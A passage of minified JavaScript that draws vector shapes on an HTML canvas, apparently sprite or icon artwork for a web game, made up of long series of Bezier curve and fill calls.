                    r.bezierCurveTo(93.50003051757812 * e, 44.9886474609375 * e, 93.50003051757812 * e, 44.9886474609375 * e, 88.00003051757812 * e, 50.9886474609375 * e),
                    r.bezierCurveTo(88.00003051757812 * e, 72.4886474609375 * e, 88.00003051757812 * e, 72.4886474609375 * e, 88.00003051757812 * e, 93.9886474609375 * e),
                    r.bezierCurveTo(94.00003051757812 * e, 90.4886474609375 * e, 94.00003051757812 * e, 90.4886474609375 * e, 100.00003051757812 * e, 86.9886474609375 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(87.00003051757812 * e, 49.625 * e),
                    r.bezierCurveTo(61.000030517578125 * e, 49.625 * e, 61.000030517578125 * e, 49.625 * e, 35.000030517578125 * e, 49.625 * e),
                    r.bezierCurveTo(35.000030517578125 * e, 70.625 * e, 35.000030517578125 * e, 70.625 * e, 35.000030517578125 * e, 91.625 * e),
                    r.bezierCurveTo(60.500030517578125 * e, 91.625 * e, 60.500030517578125 * e, 91.625 * e, 86.00003051757812 * e, 91.625 * e),
                    r.bezierCurveTo(86.50003051757812 * e, 70.625 * e, 86.50003051757812 * e, 70.625 * e, 87.00003051757812 * e, 49.625 * e),
                    r.closePath(),
                    he(r, i[1], i[3], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(47.000030517578125 * e, 36.625 * e),
                    r.bezierCurveTo(73.00003051757812 * e, 37.125 * e, 73.00003051757812 * e, 37.125 * e, 99.00003051757812 * e, 37.625 * e),
                    r.bezierCurveTo(93.50003051757812 * e, 44.125 * e, 93.50003051757812 * e, 44.125 * e, 88.00003051757812 * e, 50.625 * e),
                    r.bezierCurveTo(60.500030517578125 * e, 50.125 * e, 60.500030517578125 * e, 50.125 * e, 33.000030517578125 * e, 49.625 * e),
                    r.closePath(),
                    he(r, i[1], i[3], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(53.000030517578125 * e, 52.625 * e),
                    r.bezierCurveTo(40.000030517578125 * e, 54.625 * e, 39.000030517578125 * e, 59.625 * e, 40.000030517578125 * e, 67.625 * e),
                    r.bezierCurveTo(45.000030517578125 * e, 59.625 * e, 48.000030517578125 * e, 58.625 * e, 54.000030517578125 * e, 53.625 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(42.000030517578125 * e, 41.17047119140625 * e),
                    r.bezierCurveTo(45.000030517578125 * e, 38.17047119140625 * e, 49.000030517578125 * e, 37.17047119140625 * e, 62.000030517578125 * e, 38.17047119140625 * e),
                    r.bezierCurveTo(78.00003051757812 * e, 38.17047119140625 * e, 78.00003051757812 * e, 38.17047119140625 * e, 94.00003051757812 * e, 38.17047119140625 * e),
                    r.bezierCurveTo(100.00003051757812 * e, 38.17047119140625 * e, 102.00003051757812 * e, 38.17047119140625 * e, 101.00003051757812 * e, 47.17047119140625 * e),
                    r.bezierCurveTo(101.00003051757812 * e, 63.67047119140625 * e, 101.00003051757812 * e, 63.67047119140625 * e, 101.00003051757812 * e, 80.17047119140625 * e),
                    r.bezierCurveTo(102.00003051757812 * e, 84.17047119140625 * e, 100.00003051757812 * e, 86.17047119140625 * e, 95.00003051757812 * e, 88.17047119140625 * e),
                    r.bezierCurveTo(84.00003051757812 * e, 94.17047119140625 * e, 89.00003051757812 * e, 94.17047119140625 * e, 79.00003051757812 * e, 94.17047119140625 * e),
                    r.bezierCurveTo(59.500030517578125 * e, 94.17047119140625 * e, 59.500030517578125 * e, 94.17047119140625 * e, 40.000030517578125 * e, 94.17047119140625 * e),
                    r.bezierCurveTo(33.000030517578125 * e, 94.17047119140625 * e, 34.000030517578125 * e, 94.17047119140625 * e, 34.000030517578125 * e, 86.17047119140625 * e),
                    r.bezierCurveTo(34.000030517578125 * e, 69.67047119140625 * e, 34.000030517578125 * e, 69.67047119140625 * e, 34.000030517578125 * e, 53.17047119140625 * e),
                    r.bezierCurveTo(33.000030517578125 * e, 47.17047119140625 * e, 34.000030517578125 * e, 47.17047119140625 * e, 40.000030517578125 * e, 42.17047119140625 * e),
                    r.closePath(),
                    he(r, void 0, i[3], 4 * e),
                    n
            }
            function t0(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 376 * e,
                    i.height = 371 * e,
                    n.globalAlpha = .5,
                    n.translate(5 * e, 5 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(191.633544921875 * e, 123.98580932617188 * e),
                    n.bezierCurveTo(215.633544921875 * e, 85.98580932617188 * e, 187.633544921875 * e, 71.98580932617188 * e, 202.633544921875 * e, 19.985809326171875 * e),
                    n.bezierCurveTo(231.633544921875 * e, 68.98580932617188 * e, 253.633544921875 * e, 71.98580932617188 * e, 256.633544921875 * e, 93.98580932617188 * e),
                    n.bezierCurveTo(306.633544921875 * e, 64.98580932617188 * e, 319.633544921875 * e, 61.985809326171875 * e, 350.633544921875 * e, 58.985809326171875 * e),
                    n.bezierCurveTo(280.633544921875 * e, 86.98580932617188 * e, 281.633544921875 * e, 106.98580932617188 * e, 268.633544921875 * e, 130.98580932617188 * e),
                    n.bezierCurveTo(295.633544921875 * e, 158.98580932617188 * e, 328.633544921875 * e, 155.98580932617188 * e, 353.633544921875 * e, 90.98580932617188 * e),
                    n.bezierCurveTo(371.633544921875 * e, 158.98580932617188 * e, 337.633544921875 * e, 210.98580932617188 * e, 286.633544921875 * e, 209.98580932617188 * e),
                    n.bezierCurveTo(323.633544921875 * e, 230.98580932617188 * e, 317.633544921875 * e, 274.9858093261719 * e, 356.633544921875 * e, 305.9858093261719 * e),
                    n.bezierCurveTo(288.633544921875 * e, 297.9858093261719 * e, 288.633544921875 * e, 265.9858093261719 * e, 275.633544921875 * e, 266.9858093261719 * e),
                    n.bezierCurveTo(280.633544921875 * e, 294.9858093261719 * e, 315.633544921875 * e, 306.9858093261719 * e, 336.633544921875 * e, 316.9858093261719 * e),
                    n.bezierCurveTo(295.633544921875 * e, 318.9858093261719 * e, 264.633544921875 * e, 302.9858093261719 * e, 254.633544921875 * e, 289.9858093261719 * e),
                    n.bezierCurveTo(252.633544921875 * e, 301.9858093261719 * e, 224.633544921875 * e, 315.9858093261719 * e, 201.633544921875 * e, 356.9858093261719 * e),
                    n.bezierCurveTo(195.633544921875 * e, 313.9858093261719 * e, 195.633544921875 * e, 308.9858093261719 * e, 196.633544921875 * e, 307.9858093261719 * e),
                    n.bezierCurveTo(197.633544921875 * e, 289.9858093261719 * e, 207.633544921875 * e, 283.9858093261719 * e, 195.633544921875 * e, 258.9858093261719 * e),
                    n.bezierCurveTo(182.633544921875 * e, 282.9858093261719 * e, 190.633544921875 * e, 287.9858093261719 * e, 193.633544921875 * e, 297.9858093261719 * e),
                    n.bezierCurveTo(195.633544921875 * e, 306.9858093261719 * e, 191.633544921875 * e, 334.9858093261719 * e, 187.633544921875 * e, 354.9858093261719 * e),
                    n.bezierCurveTo(165.633544921875 * e, 320.9858093261719 * e, 138.633544921875 * e, 307.9858093261719 * e, 135.633544921875 * e, 288.9858093261719 * e),
                    n.bezierCurveTo(110.633544921875 * e, 318.9858093261719 * e, 68.633544921875 * e, 323.9858093261719 * e, 49.633544921875 * e, 320.9858093261719 * e),
                    n.bezierCurveTo(88.633544921875 * e, 308.9858093261719 * e, 108.633544921875 * e, 284.9858093261719 * e, 118.633544921875 * e, 258.9858093261719 * e),
                    n.bezierCurveTo(86.633544921875 * e, 264.9858093261719 * e, 75.633544921875 * e, 310.9858093261719 * e, 19.633544921875 * e, 304.9858093261719 * e),
                    n.bezierCurveTo(54.633544921875 * e, 276.9858093261719 * e, 59.633544921875 * e, 214.98580932617188 * e, 105.633544921875 * e, 205.98580932617188 * e),
                    n.bezierCurveTo(14.633544921875 * e, 201.98580932617188 * e, 24.633544921875 * e, 141.98580932617188 * e, 25.633544921875 * e, 82.98580932617188 * e),
                    n.bezierCurveTo(49.633544921875 * e, 168.98580932617188 * e, 87.633544921875 * e, 141.98580932617188 * e, 112.633544921875 * e, 123.98580932617188 * e),
                    n.bezierCurveTo(95.633544921875 * e, 75.98580932617188 * e, 70.633544921875 * e, 68.98580932617188 * e, 35.633544921875 * e, 50.985809326171875 * e),
                    n.bezierCurveTo(70.633544921875 * e, 53.985809326171875 * e, 102.633544921875 * e, 65.98580932617188 * e, 125.633544921875 * e, 84.98580932617188 * e),
                    n.bezierCurveTo(133.633544921875 * e, 69.98580932617188 * e, 166.633544921875 * e, 42.985809326171875 * e, 176.633544921875 * e, 21.985809326171875 * e),
                    n.bezierCurveTo(185.633544921875 * e, 49.985809326171875 * e, 168.633544921875 * e, 95.98580932617188 * e, 191.633544921875 * e, 121.98580932617188 * e),
                    n.closePath(),
                    he(n, t[0]),
                    n.globalAlpha = 1,
                    n.translate(-4 * e, -5 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(191.633544921875 * e, 123.98580932617188 * e),
                    n.bezierCurveTo(215.633544921875 * e, 85.98580932617188 * e, 187.633544921875 * e, 71.98580932617188 * e, 202.633544921875 * e, 19.985809326171875 * e),
                    n.bezierCurveTo(231.633544921875 * e, 68.98580932617188 * e, 253.633544921875 * e, 71.98580932617188 * e, 256.633544921875 * e, 93.98580932617188 * e),
                    n.bezierCurveTo(306.633544921875 * e, 64.98580932617188 * e, 319.633544921875 * e, 61.985809326171875 * e, 350.633544921875 * e, 58.985809326171875 * e),
                    n.bezierCurveTo(280.633544921875 * e, 86.98580932617188 * e, 281.633544921875 * e, 106.98580932617188 * e, 268.633544921875 * e, 130.98580932617188 * e),
                    n.bezierCurveTo(295.633544921875 * e, 158.98580932617188 * e, 328.633544921875 * e, 155.98580932617188 * e, 353.633544921875 * e, 90.98580932617188 * e),
                    n.bezierCurveTo(371.633544921875 * e, 158.98580932617188 * e, 337.633544921875 * e, 210.98580932617188 * e, 286.633544921875 * e, 209.98580932617188 * e),
                    n.bezierCurveTo(323.633544921875 * e, 230.98580932617188 * e, 317.633544921875 * e, 274.9858093261719 * e, 356.633544921875 * e, 305.9858093261719 * e),
                    n.bezierCurveTo(288.633544921875 * e, 297.9858093261719 * e, 288.633544921875 * e, 265.9858093261719 * e, 275.633544921875 * e, 266.9858093261719 * e),
                    n.bezierCurveTo(280.633544921875 * e, 294.9858093261719 * e, 315.633544921875 * e, 306.9858093261719 * e, 336.633544921875 * e, 316.9858093261719 * e),
                    n.bezierCurveTo(295.633544921875 * e, 318.9858093261719 * e, 264.633544921875 * e, 302.9858093261719 * e, 254.633544921875 * e, 289.9858093261719 * e),
                    n.bezierCurveTo(252.633544921875 * e, 301.9858093261719 * e, 224.633544921875 * e, 315.9858093261719 * e, 201.633544921875 * e, 356.9858093261719 * e),
                    n.bezierCurveTo(195.633544921875 * e, 313.9858093261719 * e, 195.633544921875 * e, 308.9858093261719 * e, 196.633544921875 * e, 307.9858093261719 * e),
                    n.bezierCurveTo(197.633544921875 * e, 289.9858093261719 * e, 207.633544921875 * e, 283.9858093261719 * e, 195.633544921875 * e, 258.9858093261719 * e),
                    n.bezierCurveTo(182.633544921875 * e, 282.9858093261719 * e, 190.633544921875 * e, 287.9858093261719 * e, 193.633544921875 * e, 297.9858093261719 * e),
                    n.bezierCurveTo(195.633544921875 * e, 306.9858093261719 * e, 191.633544921875 * e, 334.9858093261719 * e, 187.633544921875 * e, 354.9858093261719 * e),
                    n.bezierCurveTo(165.633544921875 * e, 320.9858093261719 * e, 138.633544921875 * e, 307.9858093261719 * e, 135.633544921875 * e, 288.9858093261719 * e),
                    n.bezierCurveTo(110.633544921875 * e, 318.9858093261719 * e, 68.633544921875 * e, 323.9858093261719 * e, 49.633544921875 * e, 320.9858093261719 * e),
                    n.bezierCurveTo(88.633544921875 * e, 308.9858093261719 * e, 108.633544921875 * e, 284.9858093261719 * e, 118.633544921875 * e, 258.9858093261719 * e),
                    n.bezierCurveTo(86.633544921875 * e, 264.9858093261719 * e, 75.633544921875 * e, 310.9858093261719 * e, 19.633544921875 * e, 304.9858093261719 * e),
                    n.bezierCurveTo(54.633544921875 * e, 276.9858093261719 * e, 59.633544921875 * e, 214.98580932617188 * e, 105.633544921875 * e, 205.98580932617188 * e),
                    n.bezierCurveTo(14.633544921875 * e, 201.98580932617188 * e, 24.633544921875 * e, 141.98580932617188 * e, 25.633544921875 * e, 82.98580932617188 * e),
                    n.bezierCurveTo(49.633544921875 * e, 168.98580932617188 * e, 87.633544921875 * e, 141.98580932617188 * e, 112.633544921875 * e, 123.98580932617188 * e),
                    n.bezierCurveTo(95.633544921875 * e, 75.98580932617188 * e, 70.633544921875 * e, 68.98580932617188 * e, 35.633544921875 * e, 50.985809326171875 * e),
                    n.bezierCurveTo(70.633544921875 * e, 53.985809326171875 * e, 102.633544921875 * e, 65.98580932617188 * e, 125.633544921875 * e, 84.98580932617188 * e),
                    n.bezierCurveTo(133.633544921875 * e, 69.98580932617188 * e, 166.633544921875 * e, 42.985809326171875 * e, 176.633544921875 * e, 21.985809326171875 * e),
                    n.bezierCurveTo(185.633544921875 * e, 49.985809326171875 * e, 168.633544921875 * e, 95.98580932617188 * e, 191.633544921875 * e, 121.98580932617188 * e),
                    n.closePath(),
                    he(n, void 0, t[1], 12 * e),
                    n.translate(-1 * e, 0 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(270.633544921875 * e, 88.98580932617188 * e),
                    n.bezierCurveTo(296.633544921875 * e, 65.98580932617188 * e, 318.633544921875 * e, 62.985809326171875 * e, 348.633544921875 * e, 57.985809326171875 * e),
                    n.bezierCurveTo(309.633544921875 * e, 76.98580932617188 * e, 291.633544921875 * e, 88.98580932617188 * e, 280.633544921875 * e, 99.98580932617188 * e),
                    n.closePath(),
                    he(n, t[4], t[5], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(275.633544921875 * e, 281.9858093261719 * e),
                    n.bezierCurveTo(303.633544921875 * e, 308.9858093261719 * e, 321.633544921875 * e, 308.9858093261719 * e, 335.633544921875 * e, 315.9858093261719 * e),
                    n.bezierCurveTo(305.633544921875 * e, 320.9858093261719 * e, 278.633544921875 * e, 307.9858093261719 * e, 264.633544921875 * e, 293.9858093261719 * e),
                    n.closePath(),
                    he(n, t[4], t[5], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(124.633544921875 * e, 291.9858093261719 * e),
                    n.bezierCurveTo(106.633544921875 * e, 316.9858093261719 * e, 72.633544921875 * e, 325.9858093261719 * e, 53.633544921875 * e, 319.9858093261719 * e),
                    n.bezierCurveTo(83.633544921875 * e, 308.9858093261719 * e, 97.633544921875 * e, 298.9858093261719 * e, 112.633544921875 * e, 284.9858093261719 * e),
                    n.closePath(),
                    he(n, t[4], t[5], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(113.633544921875 * e, 80.98580932617188 * e),
                    n.bezierCurveTo(91.633544921875 * e, 54.985809326171875 * e, 72.633544921875 * e, 56.985809326171875 * e, 36.633544921875 * e, 49.985809326171875 * e),
                    n.bezierCurveTo(87.633544921875 * e, 72.98580932617188 * e, 95.633544921875 * e, 82.98580932617188 * e, 106.633544921875 * e, 96.98580932617188 * e),
                    n.closePath(),
                    he(n, t[4], t[5], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(202.633544921875 * e, 20.985809326171875 * e),
                    n.bezierCurveTo(219.633544921875 * e, 49.985809326171875 * e, 259.633544921875 * e, 80.98580932617188 * e, 255.633544921875 * e, 92.98580932617188 * e),
                    n.bezierCurveTo(268.633544921875 * e, 86.98580932617188 * e, 265.633544921875 * e, 87.98580932617188 * e, 275.633544921875 * e, 82.98580932617188 * e),
                    n.bezierCurveTo(283.633544921875 * e, 87.98580932617188 * e, 283.633544921875 * e, 87.98580932617188 * e, 291.633544921875 * e, 92.98580932617188 * e),
                    n.bezierCurveTo(269.633544921875 * e, 116.98580932617188 * e, 270.633544921875 * e, 124.98580932617188 * e, 267.633544921875 * e, 130.98580932617188 * e),
                    n.bezierCurveTo(307.633544921875 * e, 168.98580932617188 * e, 339.633544921875 * e, 132.98580932617188 * e, 352.633544921875 * e, 93.98580932617188 * e),
                    n.bezierCurveTo(366.633544921875 * e, 145.98580932617188 * e, 345.633544921875 * e, 207.98580932617188 * e, 286.633544921875 * e, 208.98580932617188 * e),
                    n.bezierCurveTo(315.633544921875 * e, 223.98580932617188 * e, 327.633544921875 * e, 287.9858093261719 * e, 355.633544921875 * e, 305.9858093261719 * e),
                    n.bezierCurveTo(293.633544921875 * e, 298.9858093261719 * e, 293.633544921875 * e, 275.9858093261719 * e, 276.633544921875 * e, 266.9858093261719 * e),
                    n.bezierCurveTo(274.633544921875 * e, 282.9858093261719 * e, 287.633544921875 * e, 288.9858093261719 * e, 295.633544921875 * e, 296.9858093261719 * e),
                    n.bezierCurveTo(287.133544921875 * e, 302.4858093261719 * e, 287.133544921875 * e, 302.4858093261719 * e, 278.633544921875 * e, 307.9858093261719 * e),
                    n.bezierCurveTo(261.633544921875 * e, 297.9858093261719 * e, 258.633544921875 * e, 293.9858093261719 * e, 255.633544921875 * e, 290.9858093261719 * e),
                    n.bezierCurveTo(249.633544921875 * e, 301.9858093261719 * e, 225.633544921875 * e, 320.9858093261719 * e, 202.633544921875 * e, 354.9858093261719 * e),
                    n.bezierCurveTo(195.633544921875 * e, 318.9858093261719 * e, 196.633544921875 * e, 306.9858093261719 * e, 198.633544921875 * e, 300.9858093261719 * e),
                    n.bezierCurveTo(209.633544921875 * e, 268.9858093261719 * e, 199.633544921875 * e, 266.9858093261719 * e, 195.633544921875 * e, 256.9858093261719 * e),
                    n.bezierCurveTo(183.633544921875 * e, 274.9858093261719 * e, 182.633544921875 * e, 281.9858093261719 * e, 192.633544921875 * e, 305.9858093261719 * e),
                    n.bezierCurveTo(194.633544921875 * e, 317.9858093261719 * e, 191.633544921875 * e, 336.9858093261719 * e, 186.633544921875 * e, 351.9858093261719 * e),
                    n.bezierCurveTo(166.633544921875 * e, 318.9858093261719 * e, 141.633544921875 * e, 303.9858093261719 * e, 136.633544921875 * e, 286.9858093261719 * e),
                    n.bezierCurveTo(122.633544921875 * e, 303.9858093261719 * e, 115.633544921875 * e, 305.9858093261719 * e, 109.633544921875 * e, 306.9858093261719 * e),
                    n.bezierCurveTo(101.133544921875 * e, 301.9858093261719 * e, 94.633544921875 * e, 297.9858093261719 * e, 92.633544921875 * e, 296.9858093261719 * e),
                    n.bezierCurveTo(116.633544921875 * e, 277.9858093261719 * e, 116.633544921875 * e, 266.9858093261719 * e, 119.633544921875 * e, 257.9858093261719 * e),
                    n.bezierCurveTo(107.633544921875 * e, 257.9858093261719 * e, 65.633544921875 * e, 308.9858093261719 * e, 24.633544921875 * e, 303.9858093261719 * e),
                    n.bezierCurveTo(51.633544921875 * e, 275.9858093261719 * e, 64.633544921875 * e, 220.98580932617188 * e, 108.633544921875 * e, 205.98580932617188 * e),
                    n.bezierCurveTo(14.633544921875 * e, 198.98580932617188 * e, 26.633544921875 * e, 142.98580932617188 * e, 25.633544921875 * e, 86.98580932617188 * e),
                    n.bezierCurveTo(41.633544921875 * e, 155.98580932617188 * e, 81.633544921875 * e, 148.98580932617188 * e, 113.633544921875 * e, 124.98580932617188 * e),
                    n.bezierCurveTo(102.633544921875 * e, 93.98580932617188 * e, 95.633544921875 * e, 88.98580932617188 * e, 89.633544921875 * e, 81.98580932617188 * e),
                    n.bezierCurveTo(97.633544921875 * e, 76.48580932617188 * e, 97.633544921875 * e, 76.48580932617188 * e, 105.633544921875 * e, 70.98580932617188 * e),
                    n.bezierCurveTo(120.633544921875 * e, 78.98580932617188 * e, 121.633544921875 * e, 81.98580932617188 * e, 124.633544921875 * e, 86.98580932617188 * e),
                    n.bezierCurveTo(132.633544921875 * e, 71.98580932617188 * e, 160.633544921875 * e, 56.985809326171875 * e, 175.633544921875 * e, 23.985809326171875 * e),
                    n.bezierCurveTo(182.633544921875 * e, 53.985809326171875 * e, 170.633544921875 * e, 102.98580932617188 * e, 191.633544921875 * e, 125.98580932617188 * e),
                    n.bezierCurveTo(214.633544921875 * e, 89.98580932617188 * e, 192.633544921875 * e, 58.985809326171875 * e, 202.633544921875 * e, 20.985809326171875 * e),
                    n.closePath(),
                    he(n, t[2], t[3], 5 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(203.633544921875 * e, 21.985809326171875 * e),
                    n.bezierCurveTo(223.633544921875 * e, 63.985809326171875 * e, 227.633544921875 * e, 72.98580932617188 * e, 235.633544921875 * e, 98.98580932617188 * e),
                    n.bezierCurveTo(241.633544921875 * e, 123.98580932617188 * e, 225.633544921875 * e, 138.98580932617188 * e, 196.633544921875 * e, 122.98580932617188 * e),
                    n.bezierCurveTo(213.633544921875 * e, 93.98580932617188 * e, 199.633544921875 * e, 49.985809326171875 * e, 203.633544921875 * e, 26.985809326171875 * e),
                    n.closePath(),
                    he(n, t[3]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(175.633544921875 * e, 25.985809326171875 * e),
                    n.bezierCurveTo(176.633544921875 * e, 51.985809326171875 * e, 171.633544921875 * e, 88.98580932617188 * e, 186.633544921875 * e, 121.98580932617188 * e),
                    n.bezierCurveTo(156.633544921875 * e, 144.98580932617188 * e, 139.633544921875 * e, 120.98580932617188 * e, 147.633544921875 * e, 97.98580932617188 * e),
                    n.bezierCurveTo(152.633544921875 * e, 77.98580932617188 * e, 162.633544921875 * e, 60.985809326171875 * e, 176.633544921875 * e, 25.985809326171875 * e),
                    n.closePath(),
                    he(n, t[3]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(26.633544921875 * e, 96.98580932617188 * e),
                    n.bezierCurveTo(38.633544921875 * e, 151.98580932617188 * e, 61.633544921875 * e, 161.98580932617188 * e, 88.633544921875 * e, 168.98580932617188 * e),
                    n.bezierCurveTo(117.633544921875 * e, 177.98580932617188 * e, 113.633544921875 * e, 185.98580932617188 * e, 106.633544921875 * e, 204.98580932617188 * e),
                    n.bezierCurveTo(32.633544921875 * e, 204.98580932617188 * e, 25.633544921875 * e, 149.98580932617188 * e, 25.633544921875 * e, 97.98580932617188 * e),
                    n.closePath(),
                    he(n, t[3]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(351.633544921875 * e, 99.98580932617188 * e),
                    n.bezierCurveTo(365.633544921875 * e, 161.98580932617188 * e, 333.633544921875 * e, 203.98580932617188 * e, 287.633544921875 * e, 207.98580932617188 * e),
                    n.bezierCurveTo(255.633544921875 * e, 208.98580932617188 * e, 266.633544921875 * e, 174.98580932617188 * e, 285.633544921875 * e, 176.98580932617188 * e),
                    n.bezierCurveTo(313.633544921875 * e, 178.98580932617188 * e, 348.633544921875 * e, 135.98580932617188 * e, 353.633544921875 * e, 99.98580932617188 * e),
                    n.closePath(),
                    he(n, t[3]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(350.633544921875 * e, 302.9858093261719 * e),
                    n.bezierCurveTo(310.633544921875 * e, 280.9858093261719 * e, 314.633544921875 * e, 244.98580932617188 * e, 292.633544921875 * e, 230.98580932617188 * e),
                    n.bezierCurveTo(272.633544921875 * e, 215.98580932617188 * e, 263.633544921875 * e, 222.98580932617188 * e, 256.633544921875 * e, 236.98580932617188 * e),
                    n.bezierCurveTo(251.633544921875 * e, 249.98580932617188 * e, 264.633544921875 * e, 255.98580932617188 * e, 279.633544921875 * e, 268.9858093261719 * e),
                    n.bezierCurveTo(306.633544921875 * e, 295.9858093261719 * e, 325.633544921875 * e, 299.9858093261719 * e, 349.633544921875 * e, 302.9858093261719 * e),
                    n.closePath(),
                    he(n, t[3]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(95.633544921875 * e, 224.98580932617188 * e),
                    n.bezierCurveTo(64.633544921875 * e, 245.98580932617188 * e, 62.633544921875 * e, 280.9858093261719 * e, 32.633544921875 * e, 303.9858093261719 * e),
                    n.bezierCurveTo(59.633544921875 * e, 301.9858093261719 * e, 102.633544921875 * e, 260.9858093261719 * e, 116.633544921875 * e, 255.98580932617188 * e),
                    n.bezierCurveTo(139.633544921875 * e, 229.98580932617188 * e, 108.633544921875 * e, 209.98580932617188 * e, 97.633544921875 * e, 224.98580932617188 * e),
                    n.closePath(),
                    he(n, t[3]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(195.633544921875 * e, 253.98580932617188 * e),
                    n.bezierCurveTo(209.633544921875 * e, 282.9858093261719 * e, 205.633544921875 * e, 278.9858093261719 * e, 199.633544921875 * e, 307.9858093261719 * e),
                    n.bezierCurveTo(198.633544921875 * e, 332.9858093261719 * e, 201.633544921875 * e, 340.9858093261719 * e, 202.633544921875 * e, 348.9858093261719 * e),
                    n.bezierCurveTo(215.633544921875 * e, 313.9858093261719 * e, 226.633544921875 * e, 291.9858093261719 * e, 235.633544921875 * e, 270.9858093261719 * e),
                    n.bezierCurveTo(243.633544921875 * e, 247.98580932617188 * e, 219.633544921875 * e, 235.98580932617188 * e, 196.633544921875 * e, 252.98580932617188 * e),
                    n.closePath(),
                    he(n, t[3]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(195.633544921875 * e, 251.98580932617188 * e),
                    n.bezierCurveTo(176.633544921875 * e, 275.9858093261719 * e, 182.633544921875 * e, 285.9858093261719 * e, 191.633544921875 * e, 308.9858093261719 * e),
                    n.bezierCurveTo(194.633544921875 * e, 318.9858093261719 * e, 190.633544921875 * e, 334.9858093261719 * e, 186.633544921875 * e, 348.9858093261719 * e),
                    n.bezierCurveTo(175.633544921875 * e, 307.9858093261719 * e, 157.633544921875 * e, 291.9858093261719 * e, 155.633544921875 * e, 272.9858093261719 * e),
                    n.bezierCurveTo(150.633544921875 * e, 243.98580932617188 * e, 170.633544921875 * e, 236.98580932617188 * e, 195.633544921875 * e, 251.98580932617188 * e),
                    n.closePath(),
                    he(n, t[3]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(316 * e, 186.8020782470703 * e),
                    n.bezierCurveTo(315 * e, 173.8020782470703 * e, 298 * e, 177.8020782470703 * e, 293 * e, 183.8020782470703 * e),
                    n.bezierCurveTo(285 * e, 195.8020782470703 * e, 314 * e, 197.8020782470703 * e, 315 * e, 187.8020782470703 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(340 * e, 157.8020782470703 * e),
                    n.bezierCurveTo(327 * e, 153.8020782470703 * e, 321 * e, 168.8020782470703 * e, 330 * e, 174.8020782470703 * e),
                    n.bezierCurveTo(341 * e, 178.8020782470703 * e, 347 * e, 161.8020782470703 * e, 341 * e, 157.8020782470703 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(349 * e, 136.8020782470703 * e),
                    n.bezierCurveTo(343 * e, 135.8020782470703 * e, 342 * e, 139.8020782470703 * e, 341 * e, 147.8020782470703 * e),
                    n.bezierCurveTo(343 * e, 155.8020782470703 * e, 353 * e, 143.8020782470703 * e, 349 * e, 137.8020782470703 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(278.75 * e, 246.4375 * e),
                    n.bezierCurveTo(288.75 * e, 242.4375 * e, 301.75 * e, 248.4375 * e, 298.75 * e, 262.4375 * e),
                    n.bezierCurveTo(293.75 * e, 271.4375 * e, 287.75 * e, 271.4375 * e, 278.75 * e, 262.4375 * e),
                    n.bezierCurveTo(271.75 * e, 255.4375 * e, 274.75 * e, 250.4375 * e, 277.75 * e, 247.4375 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(310.75 * e, 277.4375 * e),
                    n.bezierCurveTo(319.75 * e, 280.4375 * e, 322.75 * e, 283.4375 * e, 321.75 * e, 289.4375 * e),
                    n.bezierCurveTo(319.75 * e, 295.4375 * e, 313.75 * e, 291.4375 * e, 308.75 * e, 288.4375 * e),
                    n.bezierCurveTo(301.75 * e, 281.4375 * e, 306.75 * e, 277.4375 * e, 309.75 * e, 277.4375 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(217.75 * e, 257.4375 * e),
                    n.bezierCurveTo(227.75 * e, 269.4375 * e, 220.75 * e, 281.4375 * e, 212.75 * e, 280.4375 * e),
                    n.bezierCurveTo(206.75 * e, 279.4375 * e, 206.75 * e, 269.4375 * e, 204.75 * e, 260.4375 * e),
                    n.bezierCurveTo(204.75 * e, 254.4375 * e, 211.75 * e, 253.4375 * e, 216.75 * e, 256.4375 * e),
                    n.closePath(),
                    he(n, t[6], t[7], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
